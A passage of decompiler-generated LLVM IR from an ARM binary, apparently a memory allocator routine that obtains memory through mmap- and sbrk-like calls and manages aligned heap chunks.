  store i32 %v3_1026c, i32* %r3.global-to-local, align 4
  %v6_10274 = icmp slt i32 %v3_1026c, %v3_10268
  br i1 %v6_10274, label %dec_label_pc_10278, label %dec_label_pc_10334

dec_label_pc_10278:                               ; preds = %dec_label_pc_10268
  %v1_10278 = add i32 %v0_10200, 10
  %v2_1027c = add i32 %v1_10278, %v3_10240
  store i32 %v2_1027c, i32* %r3.global-to-local, align 4
  %v2_10280 = sub i32 0, %v3_10240
  %v3_10280 = and i32 %v2_1027c, %v2_10280
  store i32 %v3_10280, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_10280, %v0_10200
  br i1 %tmp211, label %dec_label_pc_1028c, label %dec_label_pc_10334

dec_label_pc_1028c:                               ; preds = %dec_label_pc_10278
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_10280, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_102a4 = call i32 @function_12214(i32 0, i32 %v3_10280, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_102a4, i32* %r0.global-to-local, align 4
  %v7_102a8 = icmp eq i32 %v6_102a4, -1
  br i1 %v7_102a8, label %dec_label_pc_1028c.dec_label_pc_10334_crit_edge, label %dec_label_pc_102b0

dec_label_pc_1028c.dec_label_pc_10334_crit_edge:  ; preds = %dec_label_pc_1028c
  %v1_10358.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_10334

dec_label_pc_102b0:                               ; preds = %dec_label_pc_1028c
  %v1_102b0 = urem i32 %v6_102a4, 8
  store i32 %v1_102b0, i32* %r2.global-to-local, align 4
  %v2_102b0 = icmp eq i32 %v1_102b0, 0
  br i1 %v2_102b0, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_102b0
  %v2_102b4 = sub nsw i32 8, %v1_102b0
  store i32 %v2_102b4, i32* %r3.global-to-local, align 4
  %v2_102b8 = load i32, i32* @r4, align 4
  %v3_102b8 = sub i32 %v2_102b8, %v2_102b4
  %v3_102bc = add i32 %v2_102b4, %v6_102a4
  store i32 %v3_102bc, i32* %lr.global-to-local, align 4
  %v2_102c4 = or i32 %v3_102b8, 2
  store i32 %v2_102c4, i32* %r2.global-to-local, align 4
  %v5_102cc = inttoptr i32 %v3_102bc to i32*
  store i32 %v2_102b4, i32* %v5_102cc, align 4
  %v1_102d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_102d0 = load i32, i32* %lr.global-to-local, align 4
  %v3_102d0 = add i32 %v2_102d0, 4
  %v4_102d0 = inttoptr i32 %v3_102d0 to i32*
  store i32 %v1_102d0, i32* %v4_102d0, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_102b0
  store i32 %v6_102a4, i32* %lr.global-to-local, align 4
  %v1_102c847 = load i32, i32* @r4, align 4
  %v2_102c848 = or i32 %v1_102c847, 2
  store i32 %v2_102c848, i32* %r3.global-to-local, align 4
  %v3_102d4 = inttoptr i32 %v6_102a4 to i32*
  store i32 0, i32* %v3_102d4, align 4
  %v1_102d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_102d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_102d8 = add i32 %v2_102d8, 4
  %v4_102d8 = inttoptr i32 %v3_102d8 to i32*
  store i32 %v1_102d8, i32* %v4_102d8, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 142044, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_102e4 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_102e4, i32* %ip.global-to-local, align 4
  %v1_102e8 = add i32 %v4_102e4, 848
  %v2_102e8 = inttoptr i32 %v1_102e8 to i32*
  %v3_102e8 = load i32, i32* %v2_102e8, align 4
  store i32 %v3_102e8, i32* %r3.global-to-local, align 4
  %v1_102ec = add i32 %v4_102e4, 856
  %v2_102ec = inttoptr i32 %v1_102ec to i32*
  %v3_102ec = load i32, i32* %v2_102ec, align 4
  store i32 %v3_102ec, i32* %r2.global-to-local, align 4
  %v1_102f0 = add i32 %v3_102e8, 1
  store i32 %v1_102f0, i32* %r3.global-to-local, align 4
  %v7_102f8 = icmp sgt i32 %v1_102f0, %v3_102ec
  br i1 %v7_102f8, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_102f0, i32* %v2_102ec, align 4
  %v0_102fc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_102fc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_102fc = phi i32 [ %v4_102e4, %.thread27 ], [ %v1_102fc.pre, %bb147 ]
  %v0_102fc = phi i32 [ %v1_102f0, %.thread27 ], [ %v0_102fc.pre, %bb147 ]
  %v2_102fc = add i32 %v1_102fc, 848
  %v3_102fc = inttoptr i32 %v2_102fc to i32*
  store i32 %v0_102fc, i32* %v3_102fc, align 4
  %v0_10300 = load i32, i32* %ip.global-to-local, align 4
  %v1_10300 = add i32 %v0_10300, 868
  %v2_10300 = inttoptr i32 %v1_10300 to i32*
  %v3_10300 = load i32, i32* %v2_10300, align 4
  store i32 %v3_10300, i32* %r3.global-to-local, align 4
  %v1_10304 = add i32 %v0_10300, 880
  %v2_10304 = inttoptr i32 %v1_10304 to i32*
  %v3_10304 = load i32, i32* %v2_10304, align 4
  store i32 %v3_10304, i32* %r2.global-to-local, align 4
  %v0_10308 = load i32, i32* @r4, align 4
  %v2_10308 = add i32 %v0_10308, %v3_10300
  store i32 %v2_10308, i32* %r1.global-to-local, align 4
  %v1_1030c = add i32 %v0_10300, 872
  %v2_1030c = inttoptr i32 %v1_1030c to i32*
  %v3_1030c = load i32, i32* %v2_1030c, align 4
  store i32 %v3_1030c, i32* %r3.global-to-local, align 4
  %v1_10314 = add i32 %v0_10300, 884
  %v2_10314 = inttoptr i32 %v1_10314 to i32*
  %v3_10314 = load i32, i32* %v2_10314, align 4
  store i32 %v3_10314, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_10308, %v3_10304
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_10308, i32* %v2_10304, align 4
  %v0_1031c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1031c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_1031c = phi i32 [ %v0_10300, %bb148 ], [ %v1_1031c.pre, %bb149 ]
  %v0_1031c = phi i32 [ %v2_10308, %bb148 ], [ %v0_1031c.pre, %bb149 ]
  %v2_1031c = add i32 %v1_1031c, 868
  %v3_1031c = inttoptr i32 %v2_1031c to i32*
  store i32 %v0_1031c, i32* %v3_1031c, align 4
  %v0_10320 = load i32, i32* %r1.global-to-local, align 4
  %v1_10320 = load i32, i32* %r3.global-to-local, align 4
  %v2_10320 = add i32 %v1_10320, %v0_10320
  store i32 %v2_10320, i32* %r1.global-to-local, align 4
  %v1_10324 = load i32, i32* %r2.global-to-local, align 4
  %v0_10328 = load i32, i32* %lr.global-to-local, align 4
  %v1_10328 = add i32 %v0_10328, 8
  store i32 %v1_10328, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_10320, %v1_10324
  br i1 %tmp213, label %bb151, label %dec_label_pc_10634

bb151:                                            ; preds = %bb150
  %v5_1032c = load i32, i32* %ip.global-to-local, align 4
  %v6_1032c = add i32 %v5_1032c, 884
  %v7_1032c = inttoptr i32 %v6_1032c to i32*
  store i32 %v2_10320, i32* %v7_1032c, align 4
  br label %dec_label_pc_10634

dec_label_pc_10334:                               ; preds = %dec_label_pc_10278, %dec_label_pc_10258, %dec_label_pc_1028c.dec_label_pc_10334_crit_edge, %dec_label_pc_10268
  %v1_10358 = phi i32 [ %v1_10358.pre, %dec_label_pc_1028c.dec_label_pc_10334_crit_edge ], [ %v0_10200, %dec_label_pc_10268 ], [ %v0_10200, %dec_label_pc_10258 ], [ %v0_10200, %dec_label_pc_10278 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  %v4_1033c = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_1033c, i32* %r3.global-to-local, align 4
  %v1_10340 = add i32 %v4_1033c, 44
  %v2_10340 = inttoptr i32 %v1_10340 to i32*
  %v3_10340 = load i32, i32* %v2_10340, align 4
  store i32 %v3_10340, i32* %r0.global-to-local, align 4
  %v1_10344 = add i32 %v4_1033c, 864
  %v2_10344 = inttoptr i32 %v1_10344 to i32*
  %v3_10344 = load i32, i32* %v2_10344, align 4
  store i32 %v3_10344, i32* %r2.global-to-local, align 4
  %v1_10348 = add i32 %v4_1033c, 840
  %v2_10348 = inttoptr i32 %v1_10348 to i32*
  %v3_10348 = load i32, i32* %v2_10348, align 4
  store i32 %v3_10348, i32* %r3.global-to-local, align 4
  %v1_1034c = add i32 %v3_10340, 4
  %v2_1034c = inttoptr i32 %v1_1034c to i32*
  %v3_1034c = load i32, i32* %v2_1034c, align 4
  store i32 %v3_1034c, i32* %r1.global-to-local, align 4
  %v1_10354 = urem i32 %v3_10344, 2
  %v2_10354 = icmp eq i32 %v1_10354, 0
  %v1_10350 = add i32 %v1_10358, 16
  %v2_10358 = add i32 %v1_10350, %v3_10348
  store i32 %v2_10358, i32* %r3.global-to-local, align 4
  %v1_1035c = and i32 %v3_1034c, -4
  store i32 %v1_1035c, i32* @r8, align 4
  br i1 %v2_10354, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_10334
  %v3_10360 = sub i32 %v2_10358, %v1_1035c
  store i32 %v3_10360, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_10334, %bb152
  %v0_10364 = phi i32 [ %v2_10358, %dec_label_pc_10334 ], [ %v3_10360, %bb152 ]
  %v1_10364 = load i32, i32* %sb.global-to-local, align 4
  %v2_10364 = add i32 %v1_10364, %v0_10364
  store i32 %v2_10364, i32* %r3.global-to-local, align 4
  %v1_10368 = sub i32 -1, %v1_10364
  store i32 %v1_10368, i32* %fp.global-to-local, align 4
  %v2_1036c = and i32 %v2_10364, %v1_10368
  store i32 %v2_1036c, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_1036c, 1
  br i1 %tmp154, label %dec_label_pc_10390, label %dec_label_pc_1037c

dec_label_pc_1037c:                               ; preds = %bb153
  store i32 %v2_1036c, i32* %r0.global-to-local, align 4
  %v1_10380 = call i32 @function_12528(i32 %v2_1036c)
  store i32 %v1_10380, i32* %r0.global-to-local, align 4
  %v3_10384 = icmp eq i32 %v1_10380, -1
  store i32 %v1_10380, i32* @r4, align 4
  br i1 %v3_10384, label %dec_label_pc_10390, label %dec_label_pc_103fc

dec_label_pc_10390:                               ; preds = %dec_label_pc_1037c, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  %v4_10398 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_10398, i32* %r6.global-to-local, align 4
  %v1_1039c = add i32 %v4_10398, 864
  %v2_1039c = inttoptr i32 %v1_1039c to i32*
  %v3_1039c = load i32, i32* %v2_1039c, align 4
  store i32 %v3_1039c, i32* %r3.global-to-local, align 4
  %v1_103a0 = urem i32 %v3_1039c, 2
  %v2_103a0 = icmp eq i32 %v1_103a0, 0
  br i1 %v2_103a0, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_10390
  %v1_103a4 = load i32, i32* @r8, align 4
  %v2_103a4 = load i32, i32* %sb.global-to-local, align 4
  %v3_103a4 = add i32 %v2_103a4, %v1_103a4
  %v2_103a8 = load i32, i32* @r5, align 4
  %v3_103a8 = add i32 %v3_103a4, %v2_103a8
  store i32 %v3_103a8, i32* %r3.global-to-local, align 4
  %v2_103ac = load i32, i32* %fp.global-to-local, align 4
  %v3_103ac = and i32 %v2_103ac, %v3_103a8
  store i32 %v3_103ac, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_10390
  %v0_103b0.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_103b0 = phi i32 [ %v0_103b0.pr, %.thread29thread-pre-split ], [ %v3_103ac, %bb155 ]
  %v2_103b0 = icmp ugt i32 %v0_103b0, 1048575
  br i1 %v2_103b0, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_103c8 = phi i32 [ %v0_103b0, %.thread29 ], [ 1048576, %bb156 ]
  %v1_103b8 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_103c8, %v1_103b8
  br i1 %tmp214, label %dec_label_pc_103c0, label %dec_label_pc_10624

dec_label_pc_103c0:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_103c8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_103dc = call i32 @function_12214(i32 0, i32 %v0_103c8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_103dc, i32* %r0.global-to-local, align 4
  %v3_103e0 = icmp eq i32 %v6_103dc, -1
  %v8_103e0 = icmp eq i32 %v6_103dc, -1
  store i32 %v6_103dc, i32* @r4, align 4
  br i1 %v8_103e0, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_103c0
  %v1_103e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_103e8 = add i32 %v1_103e8, 864
  %v3_103e8 = inttoptr i32 %v2_103e8 to i32*
  %v4_103e8 = load i32, i32* %v3_103e8, align 4
  %v2_103ec = load i32, i32* @r5, align 4
  %v3_103ec = add i32 %v2_103ec, %v6_103dc
  store i32 %v3_103ec, i32* %r0.global-to-local, align 4
  %v2_103f0 = and i32 %v4_103e8, -2
  store i32 %v2_103f0, i32* %r3.global-to-local, align 4
  store i32 %v2_103f0, i32* %v3_103e8, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_103c0, %bb158
  br i1 %v3_103e0, label %dec_label_pc_103fc, label %dec_label_pc_10400

dec_label_pc_103fc:                               ; preds = %.thread32, %dec_label_pc_1037c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10400

dec_label_pc_10400:                               ; preds = %.thread32, %dec_label_pc_103fc
  %v0_10400 = load i32, i32* @r4, align 4
  %v7_10400 = icmp eq i32 %v0_10400, -1
  br i1 %v7_10400, label %dec_label_pc_10624, label %dec_label_pc_10408

dec_label_pc_10408:                               ; preds = %dec_label_pc_10400
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r2.global-to-local, align 4
  %v4_10410 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_10410, i32* %ip.global-to-local, align 4
  store i32 %v3_10340, i32* %r2.global-to-local, align 4
  %v1_10418 = add i32 %v4_10410, 872
  %v2_10418 = inttoptr i32 %v1_10418 to i32*
  %v3_10418 = load i32, i32* %v2_10418, align 4
  %v1_1041c = load i32, i32* @r8, align 4
  %v2_1041c = add i32 %v1_1041c, %v3_10340
  store i32 %v2_1041c, i32* %r1.global-to-local, align 4
  %v0_10420 = load i32, i32* @r5, align 4
  %v2_10420 = add i32 %v0_10420, %v3_10418
  store i32 %v2_10420, i32* %r3.global-to-local, align 4
  %v9_10424 = icmp eq i32 %v0_10400, %v2_1041c
  br i1 %v9_10424, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_10408
  store i32 %v2_10420, i32* %v2_10418, align 4
  br label %dec_label_pc_10440

bb159:                                            ; preds = %dec_label_pc_10408
  %v1_10428 = load i32, i32* %r0.global-to-local, align 4
  %v8_10428 = icmp eq i32 %v1_10428, -1
  store i32 %v2_10420, i32* %v2_10418, align 4
  br i1 %v8_10428, label %.thread34, label %dec_label_pc_10440

.thread34:                                        ; preds = %bb159
  %v1_10430 = load i32, i32* @r5, align 4
  %v2_10430 = load i32, i32* @r8, align 4
  %v3_10430 = add i32 %v2_10430, %v1_10430
  %v2_10434 = or i32 %v3_10430, 1
  store i32 %v2_10434, i32* %r3.global-to-local, align 4
  %v2_10438 = load i32, i32* %r2.global-to-local, align 4
  %v3_10438 = add i32 %v2_10438, 4
  %v4_10438 = inttoptr i32 %v3_10438 to i32*
  store i32 %v2_10434, i32* %v4_10438, align 4
  br label %dec_label_pc_105b8

dec_label_pc_10440:                               ; preds = %bb159, %.thread122
  %v0_10444.pr = load i32, i32* @r8, align 4
  %v0_10440 = load i32, i32* %ip.global-to-local, align 4
  %v1_10440 = add i32 %v0_10440, 864
  %v2_10440 = inttoptr i32 %v1_10440 to i32*
  %v3_10440 = load i32, i32* %v2_10440, align 4
  store i32 %v3_10440, i32* %r2.global-to-local, align 4
  %v2_10444 = icmp eq i32 %v0_10444.pr, 0
  br i1 %v2_10444, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_10440
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_10440
  %v2_1044c = urem i32 %v3_10440, 2
  store i32 %v2_1044c, i32* %r3.global-to-local, align 4
  %v2_10450 = icmp eq i32 %v2_1044c, 0
  br i1 %v2_10450, label %.thread40, label %dec_label_pc_10458

dec_label_pc_10458:                               ; preds = %.thread36
  %v0_10458 = load i32, i32* @r4, align 4
  %v1_10458 = load i32, i32* %r1.global-to-local, align 4
  %v3_10458 = icmp ult i32 %v0_10458, %v1_10458
  br i1 %v3_10458, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_10458
  %v2_1045c = and i32 %v3_10440, -2
  store i32 %v2_1045c, i32* %r3.global-to-local, align 4
  store i32 %v2_1045c, i32* %v2_10440, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_10458, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  %v4_1046c = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_1046c, i32* @r7, align 4
  %v1_10470 = add i32 %v4_1046c, 864
  %v2_10470 = inttoptr i32 %v1_10470 to i32*
  %v3_10470 = load i32, i32* %v2_10470, align 4
  store i32 %v3_10470, i32* %r3.global-to-local, align 4
  %v1_10474 = urem i32 %v3_10470, 2
  store i32 %v1_10474, i32* @r6, align 4
  %v2_10474 = icmp eq i32 %v1_10474, 0
  br i1 %v2_10474, label %dec_label_pc_10508, label %dec_label_pc_1047c

dec_label_pc_1047c:                               ; preds = %.thread40
  %v0_1047c = load i32, i32* @r8, align 4
  %v2_1047c = icmp eq i32 %v0_1047c, 0
  br i1 %v2_1047c, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_1047c
  %v2_10480 = add i32 %v4_1046c, 872
  %v3_10480 = inttoptr i32 %v2_10480 to i32*
  %v4_10480 = load i32, i32* %v3_10480, align 4
  store i32 %v4_10480, i32* %r2.global-to-local, align 4
  %v1_10484 = load i32, i32* %r1.global-to-local, align 4
  %v2_10484 = load i32, i32* @r4, align 4
  %v3_10484 = sub i32 %v2_10484, %v1_10484
  %v3_10488 = add i32 %v3_10484, %v4_10480
  store i32 %v3_10488, i32* %r3.global-to-local, align 4
  store i32 %v3_10488, i32* %v3_10480, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_1047c, %bb161
  %v0_10490 = load i32, i32* @r4, align 4
  %v1_10490 = urem i32 %v0_10490, 8
  store i32 %v1_10490, i32* %r3.global-to-local, align 4
  %v2_10490 = icmp eq i32 %v1_10490, 0
  br i1 %v2_10490, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_10494 = sub nsw i32 8, %v1_10490
  store i32 %v2_10494, i32* %r3.global-to-local, align 4
  %v3_10498 = add i32 %v2_10494, %v0_10490
  store i32 %v3_10498, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_104a0 = phi i32 [ 0, %.thread43 ], [ %v2_10494, %bb162 ]
  %v1_1049c = load i32, i32* @r5, align 4
  %v2_1049c = add i32 %v1_1049c, %v0_10490
  store i32 %v2_1049c, i32* @r6, align 4
  %v1_104a0 = load i32, i32* @r8, align 4
  %v2_104a0 = add i32 %v2_1049c, %v0_104a0
  %v2_104a4 = add i32 %v2_104a0, %v1_104a0
  store i32 %v2_104a4, i32* %r1.global-to-local, align 4
  %v1_104a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_104a8 = add i32 %v1_104a8, %v2_104a4
  %v1_104ac = load i32, i32* %fp.global-to-local, align 4
  %v2_104ac = and i32 %v1_104ac, %v2_104a8
  store i32 %v2_104ac, i32* %r2.global-to-local, align 4
  %v2_104b0 = sub i32 0, %v2_1049c
  store i32 %v2_104b0, i32* %r3.global-to-local, align 4
  %v2_104b4 = sub i32 %v2_104ac, %v2_1049c
  store i32 %v2_104b4, i32* @r5, align 4
  store i32 %v2_104b4, i32* %r0.global-to-local, align 4
  br i1 %v2_10490, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_10490, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_104c0 = call i32 @function_12528(i32 %v2_104b4)
  store i32 %v1_104c0, i32* %r0.global-to-local, align 4
  %v3_104c4 = icmp eq i32 %v1_104c0, -1
  br i1 %v3_104c4, label %dec_label_pc_104cc, label %dec_label_pc_104dc

dec_label_pc_104cc:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_104d0 = call i32 @function_12528(i32 0)
  store i32 %v1_104d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10534

dec_label_pc_104dc:                               ; preds = %bb164
  %v1_104dc = load i32, i32* @r4, align 4
  %v3_104dc = icmp ult i32 %v1_104c0, %v1_104dc
  br i1 %v3_104dc, label %dec_label_pc_104e4, label %dec_label_pc_10534

dec_label_pc_104e4:                               ; preds = %dec_label_pc_104dc
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r0.global-to-local, align 4
  %v4_104ec = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_104ec, i32* %r2.global-to-local, align 4
  %v1_104f0 = add i32 %v4_104ec, 864
  %v2_104f0 = inttoptr i32 %v1_104f0 to i32*
  %v3_104f0 = load i32, i32* %v2_104f0, align 4
  %v0_104f4 = load i32, i32* @r6, align 4
  store i32 %v0_104f4, i32* %r0.global-to-local, align 4
  %v1_104f8 = and i32 %v3_104f0, -2
  store i32 %v1_104f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_104f8, i32* %v2_104f0, align 4
  br label %dec_label_pc_10534

dec_label_pc_10508:                               ; preds = %.thread40
  %v0_10508 = load i32, i32* %r0.global-to-local, align 4
  %v3_10508 = icmp eq i32 %v0_10508, -1
  br i1 %v3_10508, label %dec_label_pc_10510, label %dec_label_pc_1052c

dec_label_pc_10510:                               ; preds = %dec_label_pc_10508
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10514 = call i32 @function_12528(i32 0)
  store i32 %v1_10514, i32* %r0.global-to-local, align 4
  %v0_10518 = load i32, i32* @r7, align 4
  %v1_10518 = add i32 %v0_10518, 872
  %v2_10518 = inttoptr i32 %v1_10518 to i32*
  %v3_10518 = load i32, i32* %v2_10518, align 4
  store i32 %v3_10518, i32* %r2.global-to-local, align 4
  %v0_1051c = load i32, i32* @r4, align 4
  %v0_10520 = load i32, i32* @r5, align 4
  %v2_1051c = add i32 %v3_10518, %v1_10514
  %v2_10520 = sub i32 %v2_1051c, %v0_1051c
  %v2_10524 = sub i32 %v2_10520, %v0_10520
  store i32 %v2_10524, i32* %r3.global-to-local, align 4
  store i32 %v2_10524, i32* %v2_10518, align 4
  %v0_10530.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1052c

dec_label_pc_1052c:                               ; preds = %dec_label_pc_10508, %dec_label_pc_10510
  %v0_10530 = phi i32 [ 0, %dec_label_pc_10508 ], [ %v0_10530.pre, %dec_label_pc_10510 ]
  %v0_1052c = load i32, i32* @r4, align 4
  store i32 %v0_1052c, i32* @r7, align 4
  store i32 %v0_10530, i32* @r5, align 4
  br label %dec_label_pc_10534

dec_label_pc_10534:                               ; preds = %dec_label_pc_104dc, %dec_label_pc_104e4, %dec_label_pc_104cc, %dec_label_pc_1052c
  %v0_10534 = load i32, i32* %r0.global-to-local, align 4
  %v7_10534 = icmp eq i32 %v0_10534, -1
  br i1 %v7_10534, label %dec_label_pc_105b8, label %dec_label_pc_1053c

dec_label_pc_1053c:                               ; preds = %dec_label_pc_10534
  %v1_1053c = load i32, i32* @r5, align 4
  %v2_1053c = add i32 %v1_1053c, %v0_10534
  %v0_10540 = load i32, i32* @r7, align 4
  %v2_10540 = sub i32 %v2_1053c, %v0_10540
  %v1_10544 = or i32 %v2_10540, 1
  %v2_10548 = add i32 %v0_10540, 4
  %v3_10548 = inttoptr i32 %v2_10548 to i32*
  store i32 %v1_10544, i32* %v3_10548, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_10554 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_10554, i32* @r6, align 4
  %v1_10558 = add i32 %v4_10554, 872
  %v2_10558 = inttoptr i32 %v1_10558 to i32*
  %v3_10558 = load i32, i32* %v2_10558, align 4
  %v0_1055c = load i32, i32* @r8, align 4
  %v2_1055c = icmp eq i32 %v0_1055c, 0
  %v0_10560 = load i32, i32* @r5, align 4
  %v2_10560 = add i32 %v0_10560, %v3_10558
  store i32 %v2_10560, i32* %r3.global-to-local, align 4
  store i32 %v2_10560, i32* %v2_10558, align 4
  %v0_10568 = load i32, i32* @r7, align 4
  %v1_10568 = load i32, i32* @r6, align 4
  %v2_10568 = add i32 %v1_10568, 44
  %v3_10568 = inttoptr i32 %v2_10568 to i32*
  store i32 %v0_10568, i32* %v3_10568, align 4
  br i1 %v2_1055c, label %dec_label_pc_105b8, label %dec_label_pc_10570

dec_label_pc_10570:                               ; preds = %dec_label_pc_1053c
  %v0_10574 = load i32, i32* @r8, align 4
  %v1_10574 = add i32 %v0_10574, -12
  %v1_10578 = and i32 %v1_10574, -8
  store i32 %v3_10340, i32* %ip.global-to-local, align 4
  %v2_10580 = add i32 %v1_10578, %v3_10340
  store i32 %v2_10580, i32* %r1.global-to-local, align 4
  %v2_10584 = icmp ugt i32 %v1_10578, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_1058c = or i32 %v1_10578, 1
  store i32 %v1_1058c, i32* %r3.global-to-local, align 4
  store i32 %v1_1058c, i32* %v2_1034c, align 4
  %v0_10594 = load i32, i32* %r2.global-to-local, align 4
  %v1_10594 = load i32, i32* %r1.global-to-local, align 4
  %v2_10594 = add i32 %v1_10594, 8
  %v3_10594 = inttoptr i32 %v2_10594 to i32*
  store i32 %v0_10594, i32* %v3_10594, align 4
  %v0_10598 = load i32, i32* %r2.global-to-local, align 4
  %v1_10598 = load i32, i32* %r1.global-to-local, align 4
  %v2_10598 = add i32 %v1_10598, 4
  %v3_10598 = inttoptr i32 %v2_10598 to i32*
  store i32 %v0_10598, i32* %v3_10598, align 4
  br i1 %v2_10584, label %dec_label_pc_105a0, label %dec_label_pc_105b8

dec_label_pc_105a0:                               ; preds = %dec_label_pc_10570
  %v0_105a0 = load i32, i32* @r6, align 4
  %v1_105a0 = add i32 %v0_105a0, 836
  %v2_105a0 = inttoptr i32 %v1_105a0 to i32*
  %v3_105a0 = load i32, i32* %v2_105a0, align 4
  store i32 %v3_105a0, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_105a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_105a8 = add i32 %v0_105a8, 8
  store i32 %v1_105a8, i32* @r0, align 4
  store i32 -1, i32* %v2_105a0, align 4
  %v0_105b0 = call i32 @function_108e4()
  store i32 %v0_105b0, i32* %r0.global-to-local, align 4
  %v0_105b4 = load i32, i32* @r4, align 4
  %v1_105b4 = load i32, i32* @r6, align 4
  %v2_105b4 = add i32 %v1_105b4, 836
  %v3_105b4 = inttoptr i32 %v2_105b4 to i32*
  store i32 %v0_105b4, i32* %v3_105b4, align 4
  br label %dec_label_pc_105b8

dec_label_pc_105b8:                               ; preds = %.thread34, %dec_label_pc_10570, %dec_label_pc_1053c, %dec_label_pc_10534, %dec_label_pc_105a0
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r0.global-to-local, align 4
  %v4_105c0 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_105c0, i32* %lr.global-to-local, align 4
  %v1_105c4 = add i32 %v4_105c0, 872
  store i32 %v1_105c4, i32* %r1.global-to-local, align 4
  %v1_105c8 = inttoptr i32 %v1_105c4 to i32*
  %v2_105c8 = load i32, i32* %v1_105c8, align 4
  store i32 %v2_105c8, i32* %r1.global-to-local, align 4
  %v3_105c8 = add i32 %v4_105c0, 876
  %v4_105c8 = inttoptr i32 %v3_105c8 to i32*
  %v5_105c8 = load i32, i32* %v4_105c8, align 4
  store i32 %v5_105c8, i32* %r3.global-to-local, align 4
  %v1_105d0 = add i32 %v4_105c0, 868
  %v2_105d0 = inttoptr i32 %v1_105d0 to i32*
  %v3_105d0 = load i32, i32* %v2_105d0, align 4
